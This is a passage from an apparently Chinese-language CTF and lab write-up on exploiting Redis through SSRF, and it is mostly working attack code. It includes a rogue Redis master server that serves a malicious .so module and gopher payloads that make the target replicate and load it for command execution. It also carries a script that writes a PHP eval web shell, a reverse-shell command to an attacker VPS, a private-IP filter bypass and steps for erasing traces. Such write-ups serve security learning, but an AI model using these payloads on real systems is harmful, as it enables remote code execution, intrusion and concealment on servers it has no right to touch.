<span class="token keyword">class</span> <span class="token class-name">RoguoServer</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>
    allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> server_address<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>RoguoServer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>server_address<span class="token punctuation">,</span> RoguoHandler<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    expfile <span class="token operator">=</span> <span class="token string">'/home/hybcx/Tools/redis-rogue-getshell/exp.so'</span>  <span class="token comment">#我们要传输的恶意文件的路径</span>
    lport <span class="token operator">=</span> <span class="token number">6666</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>expfile<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        server <span class="token operator">=</span> RoguoServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> lport<span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] listening ......"</span><span class="token punctuation">)</span>
    server<span class="token punctuation">.</span>handle_request<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] completed ~~~"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>记得修改恶意文件路径吗，如下图运行之后执行system命令成功</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230161411475.png" alt="image-20231230161411475"></p>
<h3 id="SSRF进行redis加载-so"><a target="_blank" rel="noopener" href="http://xn--SSRFredis-ew5o4638bnbsay8a.so">SSRF进行redis加载.so</a></h3>
<p>这里虽然进行了上述的实操，但感觉不够真实，毕竟感觉现实中存在ssrf的概率才是大的，虽然可以爆破弱口令，但总感觉少点什么。而且这里的ssrf攻击的过程一直没搞成功，现在再来搞一下。</p>
<p>这里我们先取消redis的主从关系，并且重新配置文件，开启目标redis的保护模式，以及只让其监听本地127.0.0.1。</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230161948095.png" alt="image-20231230161948095"></p>
<p>之后重启redis服务</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230162228324.png" alt="image-20231230162228324"></p>
<p>确定一下对方服务的配置，现在我们进行构造恶意命令</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#第一次攻击</span>
config set dir <span class="token operator">/</span>tmp
config set dbfilename exp<span class="token operator">.</span>so
slaveof <span class="token number">192.168</span><span class="token number">.246</span><span class="token number">.130</span> <span class="token number">6666</span>
<span class="token comment">#第二次攻击</span>
module load <span class="token operator">/</span>tmp<span class="token operator">/</span>exp<span class="token operator">.</span>so
system<span class="token operator">.</span>exec <span class="token string double-quoted-string">"id"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里分两次是因为第一次我们在传入命令之后，exp.so还未被加载，之后第二次才输入的加载指令，当然你也可以合并上述两个payload，然后发送两次。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">gopher</span><span class="token punctuation">:</span><span class="token comment">//127.0.0.1:6379/_config%2520set%2520dir%2520/tmp%250D%250Aconfig%2520set%2520dbfilename%2520exp.so%250D%250Aslaveof%2520192.168.246.130%25206666%250D%250Amodule%2520load%2520/tmp/exp.so%250D%250Asystem.exec%2520%2522id%2522%250D%250A</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里进行了两次编码，但是在我发送两次之后页面并没有回显，不知道是否是配置问题，但在靶机上测试如下，发现是成功加载的</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230165445669.png" alt="image-20231230165445669"></p>
<p>这让我突然迷惑了，是否我太过钻牛角尖了，本来如果这里存在ssrf的话，我们本就可以进行写入公钥，写webshell等等，这样的话我们完全就可以连接上对方redis服务，这样的话就没必要非得利用ssrf来rce了。这里的疑惑还是通过一会儿的做题来感受吧。。。</p>
<h2 id="痕迹清除">痕迹清除</h2>
<p>为了减少对服务器的影响，攻击完成后，应该尽量清除痕迹，需要恢复目录和数据库文件，卸载同时删除模块，而数据原本的配置信息，需要在攻击之前进行备份。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">CONFIG</span> get <span class="token operator">*</span>    <span class="token comment"># 获取所有的配置</span>
<span class="token constant">CONFIG</span> get dir   <span class="token comment"># 获取 快照文件 保存的 位置</span>
<span class="token constant">CONFIG</span> get dbfilename   <span class="token comment"># 获取 快照文件 的文件名</span>
<span class="token comment">#切断主从，关闭复制功能</span>
slaveof no one 
<span class="token comment">#恢复目录</span>
config set dir <span class="token operator">/</span>data
<span class="token comment">#通过dump.rdb文件恢复数据</span>
config set dbfilename dump<span class="token operator">.</span>rdb
<span class="token comment">#删除exp.so</span>
system<span class="token operator">.</span>exec <span class="token string single-quoted-string">'rm ./exp.so'</span>
<span class="token comment">#卸载system模块的加载</span>
module unload system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>漏洞利用的版本是redis 4.x/5.x ，如果是先前版本的Redis，则无法加载模块，自然也就无法利用。在网上开了几个开源的利用脚本，都没有进行版本的判断，如果直接使用exp，除了攻击失败外，可能会修改了 dir 和dbfilename ，这些都可以通过redis未授权修改回原来的配置（前提是有提前备份），而目录下会多生成一个 exp.so文件。</p>
<h1>0x06 题目实战</h1>
<h2 id="CTFHUB-SSRF-redis协议">CTFHUB-SSRF-redis协议</h2>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230172330268.png" alt="image-20231230172330268"></p>
<p>看到url，那开始测试</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230172356029.png" alt="image-20231230172356029"></p>
<p>发现存在6379的redis服务，那我们看看是否对方redis设置了密码，脚本跑一下，如下图，发现没有设置</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230172618573.png" alt="image-20231230172618573"></p>
<p>那这里我想的就是先尝试写webshell，话不多说直接上脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
ip<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>
port<span class="token operator">=</span><span class="token string">"6379"</span>
shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
passwd<span class="token operator">=</span><span class="token string">""</span>
cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"save"</span>
     <span class="token punctuation">]</span>
<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">=</span><span class="token string">""</span>
    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd<span class="token operator">+=</span>CRLF
    <span class="token keyword">return</span> cmd

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>py2运行，这里需要两次url编码</p>
<pre class="line-numbers language-none"><code class="language-none">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%25
5D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230172917747.png" alt="image-20231230172917747"></p>
<p>直接url上传，之后访问shell.php</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230172959844.png" alt="image-20231230172959844"></p>
<p>成功上传并拿到flag</p>
<h2 id="Redis-4-x-5-x主从复制RCE">Redis 4.x/5.x主从复制RCE</h2>
<p>复现地址：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/redis/4-unacc/">https://vulhub.org/#/environments/redis/4-unacc/</a></p>
<p>直接vulhub一键启动靶机，之后kali尝试连接目标redis，如下图，存在未授权访问</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230190041291.png" alt="image-20231230190041291"></p>
<p>直接上exp，这里使用了两种，但感觉第一种更好一点</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 redis<span class="token operator">-</span>rogue<span class="token operator">-</span>server<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token number">.246</span><span class="token number">.137</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token number">.246</span><span class="token number">.130</span> <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230194558436.png" alt="image-20231230194558436"></p>
<p>可以看到直接就拿到shell了</p>
<p>第二个：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 redis<span class="token operator">-</span>master<span class="token punctuation">.</span>py <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.246</span><span class="token number">.137</span> <span class="token operator">-</span>p <span class="token number">6379</span> <span class="token operator">-</span>L <span class="token number">192.168</span><span class="token number">.246</span><span class="token number">.130</span> <span class="token operator">-</span>P <span class="token number">6666</span> <span class="token operator">-</span>f RedisModulesSDK<span class="token operator">/</span>exp<span class="token punctuation">.</span>so <span class="token operator">-</span>c <span class="token string">"id"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230194640807.png" alt="image-20231230194640807"></p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230194648625.png" alt="image-20231230194648625"></p>
<h2 id="网鼎杯-2020-玄武组-SSRFMe">[网鼎杯 2020 玄武组]SSRFMe</h2>
<p>这里推荐去nssctf平台复现，buu似乎有问题</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token operator">.</span><span class="token string single-quoted-string">' is inner ip'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// Please visit hint.php locally.</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的重点就是针对url的检查，其中的对于用到的协议他规定只能是http、https、gopher与dict，但我们重点需要绕过的是这个：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里是将一个标准ip地址转换为二进制形式的长字符串，然后与这里规定的127.0.0.1、10.0.0.0、172.16.0.0、192.168.0.0进行比较，如果有一个为真，则证明标志的ssrf的攻击</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token comment">// 初始的8的二进制表示，右边有两位空出：</span>
0000 0000 0000 0000 0000 0000 0000 1000
<span class="token comment">// 执行右移两位后：</span>
0000 0000 0000 0000 0000 0000 0000 0010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里绕过似乎也挺简单的，就是0.0.0.0即可，然后根据题目提示让我们查看hint.php</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?url=http://0.0.0.0/hint.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php echo 'redispass is root';exit();"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>随后就是通过file_put_contents函数处理post传参，并且代码中提示我们redis的密码是root，这也提示我们这道题考察的就是如何通过ssrf攻击redis</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230205726243.png" alt="image-20231230205726243"></p>
<p>这里验证也说明6379的存在，<a target="_blank" rel="noopener" href="http://xn--ghq0cy2jjf78cg9c8uxsoimlb56n0plii4i16j.so">接下来先尝试向其中加载恶意.so</a>，不过需要注意密码的验证，payload如下：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">auth root  #用户认证
config set dir /tmp/  #设置备份目录
config set dbfilename exp.so   #设置备份文件名
slaveof vpsip vpsport	#设置主从关系，这里的主redis设置为我们的恶意vps
module load /tmp/exp.so	#从我们的恶意主redis上加载恶意exp.so
system.rev vpsip vpsport	#执行system命令，进行反弹shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但这道题用到的是ssrf，所以上脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">import</span> requests
payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""auth root
config set dir /tmp
config set dbfilename exp.so
slaveof vps port
module load /tmp/exp.so
system.rev vpsip vpsport
"""</span>
inner_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"gopher://0.0.0.0:6379/_</span><span class="token interpolation"><span class="token punctuation">{</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>inner_url<span class="token punctuation">)</span>
<span class="token comment">#url = "http://e90ce983-16dd-4dff-8850-58a09b264a47.node4.buuoj.cn:81/?url=" + inner_url</span>
<span class="token comment">#resp = requests.get(url)</span>
<span class="token comment">#print(resp.text)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发送之前，我们先准备好恶意master，且必须是公网的vps，这里推荐项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py</a></p>
